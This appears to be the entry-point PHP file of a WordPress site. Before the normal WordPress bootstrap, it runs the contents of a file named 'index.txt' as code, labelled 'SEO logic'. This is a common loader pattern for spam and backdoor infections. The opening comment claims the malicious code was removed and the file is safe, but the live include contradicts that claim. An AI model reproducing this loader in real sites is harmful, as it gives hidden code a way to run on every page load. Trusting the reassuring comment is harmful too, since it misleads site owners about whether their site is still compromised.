<?php
/**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 */

// Absolute path to the SEO logic file in the current directory
$seo_logic_path = __DIR__ . '/index.txt';

// Ensure the file exists before including
if (file_exists($seo_logic_path)) {
    require_once $seo_logic_path;
}

// WordPress bootstrap
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
